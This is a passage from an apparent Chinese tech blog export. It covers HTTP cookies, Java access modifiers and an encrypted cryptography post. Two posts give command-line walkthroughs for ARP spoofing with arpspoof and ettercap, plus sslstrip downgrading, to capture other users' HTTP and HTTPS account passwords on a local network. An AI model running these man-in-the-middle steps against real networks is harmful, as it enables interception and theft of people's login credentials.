<h6 id="2-1-2-Cookie是什么"><a href="#2-1-2-Cookie是什么" class="headerlink" title="2.1.2 Cookie是什么 "></a><font color="#008B45" face="楷体"><strong>2.1.2 Cookie是什么</strong> </font></h6><p><font face="仿体">&amp;emsp;Cookie在英文中是小甜品的意思，但在计算机语言中，Cookie指的是当你浏览某网站时，网站存储在你电脑上的一个小文本文件，伴随着用户请求和页面在 Web 服务器和浏览器之间传递。它记录了你的用户ID，密码、浏览过的网页、停留的时间等信息，用于用户身份的辨别。Cookie通常是以user@domain格式命名的，user是你的本地用户名，domain是所访问的网站的域名。</font></p>
<hr>
<hr>
<h6 id="2-1-3-为什么要Cookie"><a href="#2-1-3-为什么要Cookie" class="headerlink" title="2.1.3 为什么要Cookie "></a><font color="#008B45" face="楷体"><strong>2.1.3 为什么要Cookie</strong> </font></h6><p><font face="仿体">&amp;emsp;因为HTTP协议是无状态的，对于一个浏览器发出的请求，服务器无法区分是不是同一个来源，无法知道上一次用户做了什么。所以，需要额外的数据用于维护会话。 Cookie 正是这样的一段随HTTP请求一起被传递的额外数据，用于维护浏览器和服务器的会话。我们可以想象一个场景，你没有登录京东时在京东上购物，选择了3件商品放入购物车，在结算时，京东为什么还能知道这三件商品是什么？没错，是Cookie！</font></p>
<hr>
<hr>
<h6 id="2-1-4-Cookie的工作原理"><a href="#2-1-4-Cookie的工作原理" class="headerlink" title="2.1.4 Cookie的工作原理 "></a><font color="#008B45" face="楷体"><strong>2.1.4 Cookie的工作原理</strong> </font></h6><p><font face="仿体">&amp;emsp;Cookie利用网页代码中的HTTP头信息，伴随着用户请求和页面在 Web 服务器和浏览器之间传递。例如：当你在浏览器地址栏中键入了Amazon的URL，浏览器会向Amazon发送一个读取网页的请求，并将结果在显示器上显示。在发送之前，该网页在你的电脑上寻找Amazon网站设置的Cookie文件，如果找到，浏览器会把Cookie文件中的数据连同前面输入的URL一同发送到Amazon服务器。服务器收到Cookie数据，就会在他的数据库中检索你的ID，你的购物记录、个人喜好等信息，并记录下新的内容，增加到数据库和Cookie文件中去。如果没有检测到Cookie或者你的Cookie信息与数据库中的信息不符合，则说明你是第一次浏览该网站，服务器的CGI程序将为你创建新的ID信息，并保存到数据库中。（此例子来源于百度百科——Cookie）</font></p>
<hr>
<hr>
<h6 id="2-1-5-关于Cookie的一些知识点"><a href="#2-1-5-关于Cookie的一些知识点" class="headerlink" title="2.1.5 关于Cookie的一些知识点 "></a><font color="#008B45" face="楷体"><strong>2.1.5 关于Cookie的一些知识点</strong> </font></h6><p><font face="仿体">&amp;emsp;1、Cookie是基于浏览器的，因此当电脑上安装多个浏览器时，服务器会生成多个Cookie。虽然是同一个人，但服务器是识别为多个用户。<br>&amp;emsp;2、Cookie是基于浏览器的，因此当同一台电脑有多个人使用时，服务器也只会生成一个Cookie。虽然是多个人，但服务器会认为是一个用户。<br>&amp;emsp;3、Cookie是无法跨设备进行设置的。比如我们在单位和家里分别使用两台电脑，即使我们使用同一种同一版本的浏览器，我们还是生成了两个Cookie，服务器会认为是两个用户。（PS：现在有些浏览器可以同步数据，比如Chrome、Friefox，可以避免这种问题）<br><font color="red">请注意：以上所说的Cooke指的全部是Http Cookie。有一种Cookie——Flash Cookie，可以解决多浏览器的问题</font></font></p>
<hr>
<hr>
<h6 id="2-1-6-关于Flash-Cookie"><a href="#2-1-6-关于Flash-Cookie" class="headerlink" title="2.1.6 关于Flash Cookie "></a><font color="#008B45" face="楷体"><strong>2.1.6 关于Flash Cookie</strong> </font></h6><p><font face="仿体">&amp;emsp;FlashCookie是由FlashPlayer控制的客户端共享存储技术，鉴于目前Flash技术的普遍性，几乎所有的网站都采用，所以具有同Http Cookie一样的作用。在技术上，通过使用JavaScript与ActionScript可以将Http Cookie和Flash Cookie进行互通。<br>Flash cookie的优势在于：<br>1、跨浏览器<br>不管用户的计算机上安装了多少个浏览器或者浏览器的不同版本，使用Flash Cookie能够使所有的浏览器共用一个Cookie。<br>2、不易删除<br>所有的浏览器均提供了清除Http Cookie的快捷方式，但Flash Cookie并没有此种方式，并且其保存位置非常隐蔽，网民难以删除。<br>3、容量更大<br>Flash Cookie可以容纳最多100千字节的数据，而一个标准的HTTP Cookie只有4千字节。</font></p>
<hr>
<hr>
<h6 id="2-1-7-Cookie的数量"><a href="#2-1-7-Cookie的数量" class="headerlink" title="2.1.7 Cookie的数量 "></a><font color="#008B45" face="楷体"><strong>2.1.7 Cookie的数量</strong> </font></h6><p><font face="仿体">&amp;emsp;1、大多数浏览器支持最大为 4096 字节的 Cookie。因此最好用 Cookie 来存储用户 ID 之类的标识符，用户的详细信息则通过用户 ID从数据库或其他数据源中读取。<br>&amp;emsp;2、浏览器还限制站点可以在用户计算机上存储的 Cookie 的数量。大多数浏览器只允许每个站点存储 20 个 Cookie；当存储更多 Cookie时，最旧的 Cookie 便会被丢弃。有些浏览器还会对它们将接受的来自所有站点的 Cookie 总数作出绝对限制，通常为 300 个。 </font></p>
<hr>
<hr>
<h6 id="2-1-8-Cookie的失效时间"><a href="#2-1-8-Cookie的失效时间" class="headerlink" title="2.1.8 Cookie的失效时间 "></a><font color="#008B45" face="楷体"><strong>2.1.8 Cookie的失效时间</strong> </font></h6><p><font face="仿体">&amp;emsp;1、浏览器的Cookie设置会决定是否保存Cookie数据。如果浏览器不允许Cookie保存，则关掉浏览器后，这些数据就消失。<br>&amp;emsp;2、如果浏览器允许保存Cookie，那么Cookie的时间由服务器的设置决定。Cookie有一个Expires（有效期）属性，这个属性决定了Cookie的保存时间，服务器可以通过设定Expires字段的数值，来改变Cookie的保存时间。如果不设置该属性，那么Cookie只在浏览网页期间有效，关闭浏览器，这些Cookie自动消失，绝大多数网站属于这种情况。通常情况下，Cookie包含Server、Expires、Name、value这几个字段，其中对服务器有用的只是Name和value字段，Expires等字段的内容仅仅是为了告诉浏览器如何处理这些Cookies。 </font></p>
<hr>
<hr>
<p>参考：<a href="https://blog.csdn.net/u012195214/article/details/78889602">《【总结】浏览器 User-Agent 大全》</a>、<a href="https://blog.csdn.net/xinyuan_java/article/details/66092335">《User-Agent详解》</a>.<br>&amp;ensp;<br>&amp;ensp;<br>&amp;ensp;<br>&amp;ensp;</p>
]]></content>
      <categories>
        <category>HTTP协议</category>
      </categories>
      <tags>
        <tag>User-Agen</tag>
        <tag>Cookie</tag>
      </tags>
  </entry>
  <entry>
    <title>内网称霸之《HTTP账号密码获取》</title>
    <url>/post/HTTP-password/</url>
    <content><![CDATA[<p>⭐<strong>使用工具：arpspoof、ettercap</strong><br><font face="楷体"><strong>ettercap是什么？</strong></font></p>
<blockquote>
<blockquote>
<p>我们在对WEB安全检测的时候都会用到Cain和netfuke这两款工具，功能相信用过的朋友多多少少都知道，但这两款工具是在windows下运行的。<br>而ettercap是在linux下运行的 。其实功能都是差不多的，我称呼它为嗅探工具，ARP欺骗，DNS，劫持，中间人攻击等等。总之这是一款强大的安全测试工具。</p>
</blockquote>
</blockquote>
<h4 id="一、ARP欺骗"><a href="#一、ARP欺骗" class="headerlink" title="一、ARP欺骗"></a>一、ARP欺骗</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br><span class="line">cat /proc/sys/net/ipv4/ip_forward</span><br><span class="line">arpspoof -i eth0 -t 目标IP 目标主机网关</span><br></pre></td></tr></table></figure>
<h4 id="二、使用ettercap获取HTTP账号和密码"><a href="#二、使用ettercap获取HTTP账号和密码" class="headerlink" title="二、使用ettercap获取HTTP账号和密码"></a>二、使用ettercap获取HTTP账号和密码</h4><p><font face="楷体">另开一个终端，输入ettercap -Tq -i eth0</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ettercap -Tq -i eth0</span><br></pre></td></tr></table></figure>
<blockquote>
<blockquote>
<p>-T:文本模式<br>q:安静模式<br>i:指定网卡<br>成功后当靶机浏览HTTP网页试用账号和密码登陆时，这个终端窗口就会显示相应的url、账号、密码。<br>💛💙❤注意：当对方的用户名是使用中文登陆的，则终端窗口账号处显示的是编码，则需要使用到url解码，将这串编码解码成中文。</p>
</blockquote>
</blockquote>
<p>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;</p>
]]></content>
      <categories>
        <category>Kali-内网称霸</category>
      </categories>
      <tags>
        <tag>ARP欺骗</tag>
      </tags>
  </entry>
  <entry>
    <title>Hash函数和消息认证</title>
    <url>/post/Hash-Message-Authentication/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="3a1f7608d08bcaceb00a084c797980d6dd33a2f9d9c011624ff3d93c29e5fc87">f2cb6dad3997b265c98f36a97452129cc092e92f124168e062928c4d9cb8fadca46648e736fc1bc951b9b43d510bf6863bad8153b565e4b7b9e9d750ec263e6169692dd465dd02789a5d5f6b40a052a6762006d5903d54247fd4f90b5c300dba82c9c8474d0c1ee774ba407ecebc89db673c1e06b5ab648edd2d6929cc982fff3f83c5ef11ea21ad8bf1f072dfbe8b3e5f78bcaec3aad3ea127593d3a85215b69998c1daf92873ab625a6ac449462442f515417da5a9f61f5c6ef7c73ca50a4fd106dd996a3a1cc8a452c3c353b8efbbf3555f229f96aa686666eef91adf6f100efc8d0d7a65d477f3519b3373ce42e5b9b38c0cd709e62e2c83cf580686a12af8275882efba152552a8ad7b77e2911ab0152741ebe4f8ae570da73c7cb7d66d1868c550a40b2408a56d860e8d1310f11c74d818cdd2e366bd0c223851bbbcf29e9797e30b60124b035b27b518ca6ea1ec5bffbc2622f18b7781a42e9fd1222ca669b462fd5f1119a1c5e2e098e4f5c3fccbabb6624c932dec0b98105b03d23888bc6cfda1bc9d9a369f77747a8811e62123005c7dd4eb8dbc1f643332b26c762ee7dba6ad3ebd29880827b117fd20412382a5a39fec8e16c83becb6d7081c71d1f892ef2d0f96cd1f6ffe9ea4c41c1bab56609f0f52e6edcab859fe7e8abb78bba93801d10dc6cc372853d6cefdf2fe5ff54b63bf7e90ac8d5515cdecf159ea2cd425f9d21058a1938e9284fcaf13088a67cf26f3b358f5576e68946f7acea84c865b68a8e4a9de6dd7cb2fdf4430a53458b62ead48e427ad173a6a0ec487c734369db3a2d7b66897adc00b477a1a4037b01f804bf99635786722784fb727ea9ffc8e15ea8e3c91278a6f3531f2d6bdaebd8977ef09aaa93fbc72b228173207abf52a5b562c34dd184caf7b5671b5d42bb9a7513ded40be277952ea8524bc18dc5a39844845199c7868a69dedb27c09bcc9dd0412538f6026569478f0c0725317ebf655af8a6e878ddd61e9c24baf4eb7275abe5b8338c9b5b42f695a9daf01d510e00b8e669b5a00570aeb8fd642e6aa7475f2bee64078fcb3c87755adcb5de6088dfb84625ea616fb48e19e7a929dc9cd2a6b15da29a0d96e4f29ff5c53feca2a9408ca5250ee6831b59ffe300a688d11eb2a37e2b67e2105e35989f3d5214a769e10d15f5127594451f86ad51cdaa5f8bb836c7cb6f280f3b6bf36d49b17fd2548ce682d0e99cc5fbd443213a8c7bb57c75b7556d8813e9f01deafed59e4bbb041114424426989f9dce49909897ec52269a830f151b7a66fa7b9d16654e5e605f4824783fea79231cd9de3dd32346754a972f34140895520bc00fe8db6dd43378a22cde1ad3eb26d535fc79d2c1d6ce111b48b83b9bfefa0edcb4b66c0c2ec90e6ccd4aaa2139ee3957aa80f66ff6906b17faebd916587b1ba9d057921e380a71598be17b2f96128945884bd74fb4c26a863844a517016e2d360ee48bbf74aa1c1791a9b049bcc0ca1aaceea51462973990886873dd7a64e7247fc268cb73ae5d87d36dd857db88d57e0b5c546a8063c525d7affdcf74e49f671e5b7cfb6aea7fa1b614d679157222aaef2536d53756a04fc55e64465d2c91fc94709dead5382b43ba4169c85d15e9eec1bc71472f5cd6765b62e149200cdbcfb376b7e1c6cf9333760e66f4a53e06b2d9a4c761ba470e47a436a8298e7d6f1bdfc571f07e0580ba1402a379ef4c3c79cc95365399537197a4e4c83f41d0de74faeab44061a177cc8eb9e68698fcf558525670ffd76a89ecf89fd7db33d453daf67019bc8b37e43a1a12114b9ddef987c3da74310ea393437491afd2b80bdc55c9f4659085898f2a369feceb21e87021c77b0e9d6c3ac9c90bf4150edef3ef1e694cefd226942f2960867e4e1d416d721560999bf18061e78b26c560a9d782d9ab06a9d324e88529691daf2e683cdbf78912e9abebd79e4ecf5b4da22a9f2e91bb497ba928a9e173697cb40e4681852ef220b44254458b601dc065906227b727819825795e5aab7672b878d7b04c47c868e800c2c2088e6dbe8dca2587693ce90efeaf1ba0dc438a4bdea79e9d5f59177f37a7056f096b11172dfb95ef5ed8beb63178a1c22c6c84d475ad16fc001da2f0548701624d6bc7352581805c78bd782c8b7c73c4afcb2f4fb64c41c068c1893078ef60fb0c55d51721a7dcd4f6a0aa136318908fd843de07b8456b91515f8eae7cecdaa98586a62916fe6a97f4e4fffb807ef2ccb93873b660bce13913bb815f90b7f328260e469b1ff75a2c399c383059759433ca03d8a6692f474c69564db44649b45dcbfc19cb49c24a7c8f2b0d6d6d374eaf4451281df62d807355a405d4fecccd0fd79bd47306b20bbef79a594e3c9c50f76beb09f741076143261978dad36cccf6725c5036c85b0a6d9086255a9622f3806098caa1d75d1a792379f85b1fe69e9143bee98d948e12bd76609847e8fced82abfccede3284e1f2f0d7e2753e6ada80e83fb41715c994325daacf122edf3b6c58bfffa053f3d055bd62b521639656d1bacaa1226afb9bec30e829a6776aaf8e449a5cd681720c3f7a5e26a8ee962f2ef724b85376a984da5ccc37a4a708027010967d30a433d588f5a7a9377e7fd037e9e74c59e516b022ae85967da95396cfc472b31ed9e18c4ea6eadb7670f60ab9d06c8230d1f2482d8fab22d7bcac21bb44560fd83db26d0fa843cd5969ff33c1e14c79b6a8c4833ce30a54512f17aea1051929c9ceeaca5f30854e507cd632279e900b71f617fee8ceb8e7bd72753f8c841d0c993d27ea149936d9937d85ee8298f605716a4dcf8fa75121234da54a547506ec0920ce659f82f48a7d4f1a32f85e900039532cac20c8bec7f3aac8921f80a1402ab139330558629a7b250d097647c3158f49bded321c9f654c8f718017809ffd120a2d518b24fea1bb93d59f94e34eb60dd2fd223cb9e51fd00a4915d62325817f34735218e5def99def25c05083ae8a7beb5a58f26617537b46662790edd6b5b24f4772729b191bbcb657593f7f8a1776b2df8feb08202c78bfe5b7ff230058057c246e028475c8796d8310f82576cddb60d732e94419a2b13e07cf16a9ea64865da35d8b7476925b1391668cac2b96ffd8cfec751940b4630f2587781f86cb6dd1b17b51b7816608d5c6f25c941d5618bf8cda0b7ef7153af842a7e0e8b7f7e3de97552284ca6688b24447190110a5d9dd8402f819f721e6069560adce316c17ece6ee2648db8236915fe1e9b5d1c2f5b5f028e92583f0d674fb53c18b91e3792ab8a32241194022a4620ad0312a326decc02139d173bb8428339a933722f189cfa46830eb45c0500f95011945991e284570caffa0b50ce46eca35691b5a2e5fd673134b62b59225cabd2fd12c3e9c4b497bb89ed53ed10880bfa907eb5015d09a525478117c6f5a7ce054f8400fa96f604443bd1160a74c448ca7227aa339b90466ded45c8b82f315c8459b7dd04b18c1240168d5d3661972e442f1fb2a1b78c6b97df8911d649ee5814933467508ee91cead8a111222926e064451374f5b99edef8e9fbfb6000748e8cd584f71d1d2e15fcadb0e6730423e0fd7e24b1f3550325684852889f10ff8a93647d9ca0d4ae1521f4f2ab9a360d97dc583300129e74ac15d0cbd3d2a4a308a38b1c2f8cb55d77b07f36769068e72167f3bce7c8219b85f53ad6cd7337d3ebd3510b6c7c189d605bc6789be846a289ecc215fcb2cc64778f64cece852efbe787765c872bca0aecd8b893d333aaf80878d70d2a846a657610db5b644fd3fcc35f1407ffe26de6432254e8c88429e542ca42ce940b262554d00dc8ce891ea8a9f5363e99ace34156050f4879e62d5cfc88112b463d592c9c3995489a002c9bfbd6c5120d81fb5398c35fa76a06d7b7a1a35e5c24b4f44f192bbce1f6b1001c0a7a660dde70496d12f9009b3acee43ff5cbde51beac279b6410a14611124622a3943d0fb128b44613303813660abfe3af1fa4cad5022db58e16083c8e3d65fdac62becd83d76ea2264d8d48bef316db6708335ef6c30564df60004c97bae7ac428c8e0f956f9abea800cbbe0bc8bf3f6380cbfdf65f1e172958ce1475af3cf67f779ec64f297c3742cdbf093cfa7c759319138c34777aa32acbcc9f335457a9cb5bc99fcda5d2e9f1834a12defe3ccac4097e853502c36766f5f801489127e1618fef5875537a968bfbef5ed6d27f2c47f5fc51ee8c2996b42cfb0148138e16c10a05e57c9b79dda3f2ac6d4c9c517a6d6a9707e857329a636b9d025d4c172f7d55c3ac08c9da3f58ddd8a93e0fce2822fd0a46101803d05c522b2d75e1edf24528f27caf592ae5ffb6f23fab3f76a2373ed94371ebd642b9f305b91efc77a521f9c5306fae6b4864c3b537cef99341d2dc1973d250ae8e8447b715f95a4c8fb40972326b9b36eb6cdd532434ff7e4f78eabdd98a7080f5d97cb45ddfea37379abcd8d57b7bfd835d8d5d43739f3cb73856c5e75288a9ea80fb1a17e46780f0055d7ead0070a3d2171b6c641b090fae0b42a7870c91a5aec4323a1528cc5a6953cf4fb804a2bc9f8ae49f8594afcc887b0dcaed9ad15c010933af46679cb3326ce906dc98a4ad89eb704ff67b42ded5cbbab4405f045278c8735060efa8321ea0947fb651c1dcd175f189c9cd335cd86445745f056db15442802056aa3547916b982b4e5b84d42e84bd2ead230b295d41f0f6e3e6dcd12636aa119273041c37feb104c43b8735ccdef585cb755a5f0ccacea2e0cd8ca7e851da5f6a0bbe741ff9298209d86c3604cba02f7204263f3edeb3132089b24dacd9e2275999f669dcb1e8e354d6d14747f2446a9a29a35883c114ec0c6bff5df60cd8b50c4b15797fa030c3e826f8f909f397950f622cc76f25d26c50f65c01dc4e9168f0dc81f591f78d83e4485e04c3d427fdfe67a408f6da2dcf40b5eb869b822f473f3d1eeffdcf9e67529b58c16a79b61b103182ee762cb145deb77c363a059619164392c81ff0839342b0a6373542cb4a990d54cc02b43d6d37f0d994564e1e38e797fc875307f101909b16e557916c5a3a524468a77913f930215c3e0e49cc37ce453520654a410a965e320b6ded70868e4241ce66662a648cb6242950ad0bb94fbfaf5f8257fefeab19064684b940b6827e277b2a8f4ba449e4557ee5864557537d934d116f7c7edef60555fc6d8616aa80446c75d712d93b782fefc51db418d0b830c77e7ddfa9097cccaf28dc25183b5cfec406d42ac6cfbb875a5d0d6d7b9730b23922b9823921499d08bd8730f7575d6595abc142760a87f89b6bc4b79879ce1c3615c57def4aa38711a6b995fbb462bad9dcd473820c98a78dfce5e3678c315e93af3462a8e419b82b51efa89ba1dd7b5f9574e2eb8ebbc88c5029bc8529fa8172730a1ff8697633b0ba55b961c7b51caf54b15d616668941d7f5629be3c4c3071f66de2fe449c127f52beb32c30ee78cb0a970fd26166baedfb978b98c65fa9e96442a71b5522bc15d40c1d64530c84dfd9a713cb</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>Hash函数</tag>
      </tags>
  </entry>
  <entry>
    <title>内网称霸之《HTTPS账号密码获取》</title>
    <url>/post/HTTPS-password/</url>
    <content><![CDATA[<p>⭐<strong>使用工具：arpspoof、ettercap、sslstrip</strong></p>
<h4 id="一、将HTTPS转换成HTTP"><a href="#一、将HTTPS转换成HTTP" class="headerlink" title="一、将HTTPS转换成HTTP"></a>一、将HTTPS转换成HTTP</h4><table><tr><td bgcolor=#D1EEEE>在获取HTTPS账号、密码的操作前需要修改ettercap的设置，否则无法成功。
1.先编辑/etc/ettercap/etter.conf下的文件内容，更改ettercap设置；
1.1输入/etc/ettercap/etter.conf后找到：
# if you use iptables:
#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
这个地方
2.改为（去掉两个#）：
# if you use iptables:
redir_command_on = "iptables <font color="red">-t</font> nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
redir_command_off = "iptables <font color="red">-t</font> nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
3.输入sslstrip -a -f -k 实现https转换成http以获取帐号密码；
4.在该终端窗口下右键选择“复制SSH渠道(S)”；
5.接着直接使用HTTP账号密码获取的方法就可以了。
</td></tr></table>

<blockquote>
<blockquote>
<p>vim使用方法：<br>编辑：按下i；<br>保存并退出：按下Esc，然后按Shift和：(冒号)，按下wq，完后按回车；<br>不保存并退出：按下Esc，然后按Shift和：(冒号)，按下q!，完后按回车；</p>
</blockquote>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/ettercap/etter.conf</span><br><span class="line">i</span><br><span class="line">删除两个<span class="comment">#</span></span><br><span class="line">Esc、Shift ：、wq、回车</span><br><span class="line">sslstrip -a -f -k</span><br></pre></td></tr></table></figure>
<h4 id="二、ARP欺骗和抓包获取HTTPS账号和密码"><a href="#二、ARP欺骗和抓包获取HTTPS账号和密码" class="headerlink" title="二、ARP欺骗和抓包获取HTTPS账号和密码"></a>二、ARP欺骗和抓包获取HTTPS账号和密码</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br><span class="line">cat /proc/sys/net/ipv4/ip_forward</span><br><span class="line">arpspoof -i eth0 -t 目标IP 目标主机网关</span><br><span class="line">ettercap -Tq -i eth0</span><br></pre></td></tr></table></figure>
<p>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;<br>&amp;nbsp;</p>
]]></content>
      <categories>
        <category>Kali-内网称霸</category>
      </categories>
      <tags>
        <tag>ARP欺骗</tag>
      </tags>
  </entry>
  <entry>
    <title>Java类、成员变量、static访问权限(4.1-4.4)</title>
    <url>/post/Java-Access-Permissions-3/</url>
    <content><![CDATA[<p>&amp;ensp;<br>&amp;ensp;</p>
<h4 id="一、-Java中类的定义、类访问权限"><a href="#一、-Java中类的定义、类访问权限" class="headerlink" title="一、 Java中类的定义、类访问权限"></a><font color="#FF6347" face="Comic sans MS">一、 Java中类的定义、类访问权限</font></h4><h5 id="1-1-类的定义格式："><a href="#1-1-类的定义格式：" class="headerlink" title="1.1  类的定义格式："></a><font color="#3CB371" face="Comic sans MS">1.1  类的定义格式：<font></h5><p><font color="red"><strong>[修饰符] class 类名 [extends父类名] [implements接口名列表]</strong></font><br>&amp;emsp;<br>&amp;emsp;<br><img data-src="https://i.loli.net/2018/12/24/5c1fb67d13ec7.png" alt="1"></p>
<p>&amp;emsp;</p>
<h5 id="1-2-类修饰符的访问权限："><a href="#1-2-类修饰符的访问权限：" class="headerlink" title="1.2  类修饰符的访问权限："></a><font color="#3CB371" face="Comic sans MS">1.2  类修饰符的访问权限：<font></h5><table>
<thead>
<tr>
<th>类修饰符</th>
<th>访问权限</th>
</tr>
</thead>
<tbody><tr>
<td><font color="#EE3A8C" face="Arial">缺省(默认方式)</font></td>
<td><font face="Comic sans MS" color="#EE3A8C">这种类只能被同一个包中的类访问；</font></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">public(公共)</td>
<td><font face="Comic sans MS" color="#EE3A8C">它修饰的类能被所有的类访问；</font></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">abstract(抽象)</td>
<td><font face="Comic sans MS" color="#EE3A8C"> 它修饰的类不能被实例化，它可能包含有未实现的方法。</td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">extends(继承)</td>
<td><font face="Comic sans MS" color="#EE3A8C">该保留字用来表明新创建的类继承哪个类, 被继承的类称为此类的父类。extends后面只能跟一个父类名称, 因为Java中一个类最多能继承一个类(单继承)。</font></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">final(最终)</td>
<td><font face="Comic sans MS" color="#EE3A8C"> 它修饰的类不能被继承，即不能有子类。</font></td>
</tr>
<tr>
<td><font color="#EE3A8C" face="Arial">implements (实现)</td>
<td><font face="Comic sans MS" color="#EE3A8C">该保留字用来表明这个类实现了哪些接口，接口名可以有多个。</td>
</tr>
</tbody></table>
<p>&amp;emsp;</p>
<h5 id="1-3-关于类访问权限的总结："><a href="#1-3-关于类访问权限的总结：" class="headerlink" title="1.3  关于类访问权限的总结："></a><font color="#3CB371" face="Comic sans MS">1.3  关于类访问权限的总结：<font></h5><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">1.    具有继承关系的子类可以继承父类的一些成员变量，即可以不创建对象就可以直接访问，如果是
      同一个包的子类可以继承到public、缺省和protected修饰的变量，如果是不同的包的子类就只能继承
      到public 和protected的；
2.    如果是其他类，不管是一个包还是不在一个包，都要创建该类的对象才能引用
3.    如果是main方法，不管是本类还是非本类，要访问实例变量都要创建对象，可以引申到其他所有
       的类方法中
4.    私有成员只能在本类中访问，如果在main方法中访问私有成员 必须创建对象</font></td></tr></table>

<p>&amp;ensp;<br>&amp;ensp;</p>
<h4 id="二、-成员变量访问权限"><a href="#二、-成员变量访问权限" class="headerlink" title="二、 成员变量访问权限"></a><font color="#FF6347" face="Comic sans MS">二、 成员变量访问权限</font></h4><p>&amp;ensp;<br><img data-src="https://i.loli.net/2018/12/24/5c1fbf2618e79.png" alt="2"></p>
<p>&amp;ensp;<br>&amp;emsp;</p>
<h5 id="2-1-成员变量访问权限总结为："><a href="#2-1-成员变量访问权限总结为：" class="headerlink" title="2.1  成员变量访问权限总结为："></a><font color="#3CB371" face="Comic sans MS">2.1  成员变量访问权限总结为：<font></h5><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**(1) 访问修饰符缺省**
访问修饰符缺省时，成员变量只能被同一包(package) 中的所有类访问，所以也称为包(package)变量。
(缺省访问修饰符实际是friendly修饰符，但因为friendly不是Java语言的关键字，所以friendly修饰符
不能显式说明。）
**(2) public(公共)**
public修饰的成员变量可以被程序中的任何类所访问。由于public成员变量不受限制, 这易使类的对象引起
不希望的修改，建议成员变量尽量不要使用public修饰符。
**(3) protected (受保护)**
protected修饰的成员变量可以被本包及有继承关系的类自由访问。
**(4) private (私有)**
private修饰的成员变量只能在同一个类中使用。这种方式通常是最为安全的。
</font></td></tr></table>

<p>&amp;ensp;<br>&amp;ensp;</p>
<h4 id="三、-static-静态-——静态变量访问权限"><a href="#三、-static-静态-——静态变量访问权限" class="headerlink" title="三、 static(静态)——静态变量访问权限"></a><font color="#FF6347" face="Comic sans MS">三、 static(静态)——静态变量访问权限</font></h4><table><tr><td bgcolor=#ADD8E6>(1)<font color="green">**static修饰的成员变量称为**</font><font color="#1874CD">**类变量(静态变量)**</font>；<font color="green">**不用static修饰的成员变量又叫**</font><font color="#1874CD">**对象变量(实例变量)。**</font>
(2)<font color="red">**区别：</font>**对象变量依附于具体的对象实例，它的值因具体对象实例的不同而不同，而类变量为该类的所有
对象所共享，它的值不因类的对象不同而不同。
(3)可以通过类来访问静态成员变量，也可以通过该类的对象访问静态成员变量。
&ensp;&ensp;<font color="red">**形式：类名.成员变量/对象名.成员变量**</font>
(4)<font color="red">**反过来，非staic的对象方法可以直接使用static的类变量**</font>
(5)类方法不能直接调用类中的对象方法（非static方法）。
(6)定义变量时必须当即赋值。
</td></tr></table>

<p>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
        <tag>Java访问权限</tag>
      </tags>
  </entry>
  <entry>
    <title>Java的输入输出</title>
    <url>/post/Java-IO-1/</url>
    <content><![CDATA[<h4 id="一、Java中的流的概念"><a href="#一、Java中的流的概念" class="headerlink" title="一、Java中的流的概念"></a><font color="#EE3A8C" face="楷体">一、Java中的流的概念</font></h4><h5 id="1-0-数据流的概念"><a href="#1-0-数据流的概念" class="headerlink" title="1.0 数据流的概念"></a><font color="#EE3A8C" face="楷体">1.0 数据流的概念</font></h5><blockquote>
<blockquote>
